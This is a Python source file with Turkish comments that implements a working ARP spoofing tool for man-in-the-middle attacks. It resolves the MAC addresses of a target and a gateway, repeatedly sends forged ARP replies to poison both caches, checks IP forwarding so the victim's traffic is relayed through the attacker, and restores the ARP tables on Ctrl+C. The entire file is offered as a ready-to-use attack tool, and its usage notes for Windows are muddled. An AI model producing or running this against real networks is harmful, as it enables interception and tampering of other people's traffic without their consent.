#!/usr/bin/env python3
"""
Basit ARP Spoofing scripti (MITM icin).

Gereksinim: pip install scapy  + root/sudo
Kullanim:
    sudo python3 arpspoof.py -t 192.168.1.50 -g 192.168.1.1
    sudo python3 arpspoof.py -t 192.168.1.50 -g 192.168.1.1 -i wlan0
(Eger windowsda kullanacaksaniz kontrol panelini yonetici olarak calistirin 
    python3 arpspoof.py -t 192.168.1.50 -g 192.168.1.1
veya
    python3 arpspoof.py -t 192.168.1.50 -g 192.168.1.1
yazınız)

Cikis (Ctrl+C) sirasinda ARP tablolarini otomatik onarir.
"""

import argparse
import subprocess
import sys
import time
from signal import SIGINT, signal as sig_handler

from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp, srp


def get_mac(ip: str, iface: str):
    """IP'nin MAC adresini ARP istegi ile bul."""
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,
        iface=iface,
        verbose=False,
    )
    for _, rcv in ans:
        return rcv[Ether].src
    return None


def get_iface_for(ip: str) -> str:
    """Hedefe giden arayuzu bul."""
    return conf.route.route(ip)[0]


def arp_reply(dst_ip, dst_mac, claimed_ip, hwsrc, iface, count=1):
    pkt = Ether(dst=dst_mac) / ARP(
        op=2,
        pdst=dst_ip,
        hwdst=dst_mac,
        psrc=claimed_ip,
        hwsrc=hwsrc,
    )
    sendp(pkt, iface=iface, count=count, inter=0.2, verbose=False)


def spoof_loop(target_ip, target_mac, gateway_ip, gateway_mac, my_mac, iface, interval=2.0):
    """Iki yonlu zehirlemeyi surekli tekrarla (ARP girdileri zaman asimina ugradigi icin)."""
    while True:
        arp_reply(target_ip, target_mac, gateway_ip, my_mac, iface)   # hedefe: gateway = ben
        arp_reply(gateway_ip, gateway_mac, target_ip, my_mac, iface)  # gateway'e: hedef = ben
        time.sleep(interval)


def restore(target_ip, target_mac, gateway_ip, gateway_mac, iface):
    """Gercek eslemeleri geri gondererek ARP tablolarini onar."""
    print("[*] ARP tablolari onariliyor...")
    arp_reply(target_ip, target_mac, gateway_ip, gateway_mac, iface, count=5)
    arp_reply(gateway_ip, gateway_mac, target_ip, target_mac, iface, count=5)


def main():
    p = argparse.ArgumentParser(description="Basit ARP spoofing araci")
    p.add_argument("-t", "--target", required=True, help="Hedef IP")
    p.add_argument("-g", "--gateway", required=True, help="Gateway IP")
    p.add_argument("-i", "--iface", help="Arayuz (otomatik bulunur)")
    p.add_argument("-n", "--interval", type=float, default=2.0, help="Gonderim araligi (sn)")
    args = p.parse_args()

    iface = args.iface or get_iface_for(args.target)
    my_mac = get_if_hwaddr(iface)

    print(f"[*] Arayuz: {iface}  |  Kendi MAC: {my_mac}")
    print(f"[*] Hedef MAC aranıyor: {args.target}")
    target_mac = get_mac(args.target, iface)
    gateway_mac = get_mac(args.gateway, iface)

    if not target_mac or not gateway_mac:
        sys.exit("[!] MAC adresi bulunamadi. IP/arayuz dogru mu? Ayni agda misin?")

    print(f"[*] Hedef: {args.target} ({target_mac})")
    print(f"[*] Gateway: {args.gateway} ({gateway_mac})")

    fwd = subprocess.run(["sysctl", "-n", "net.ipv4.ip_forward"],
                         capture_output=True, text=True).stdout.strip()
    if fwd != "1":
        print("[!] UYARI: IP forwarding kapali. Su komutu calistir, yoksa hedefin "
              "interneti kesilir:\n    sudo sysctl -w net.ipv4.ip_forward=1")

    def on_exit(*_):
        restore(args.target, target_mac, args.gateway, gateway_mac, iface)
        sys.exit(0)

    sig_handler(SIGINT, on_exit)

    print("[*] Zehirleme basladi. Cikis: Ctrl+C\n")
    try:
        spoof_loop(args.target, target_mac, args.gateway, gateway_mac,
                   my_mac, iface, args.interval)
    except KeyboardInterrupt:
        on_exit()


if __name__ == "__main__":
    main()
